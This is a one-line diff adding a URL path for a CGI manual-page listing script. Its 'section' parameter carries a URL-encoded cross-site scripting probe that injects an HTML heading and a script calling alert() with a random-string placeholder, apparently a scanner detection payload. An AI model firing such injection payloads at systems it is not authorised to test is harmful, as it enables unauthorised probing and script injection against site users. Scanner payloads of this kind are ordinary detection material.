@@ -1,0 +1,1 @@
+/cgi-bin/manlist?section=%22%3E%3Ch1%3Ehello%3C%2Fh1%3E%3Cscript%3Ealert(/{{randstr}}/)%3C%2Fscript%3E
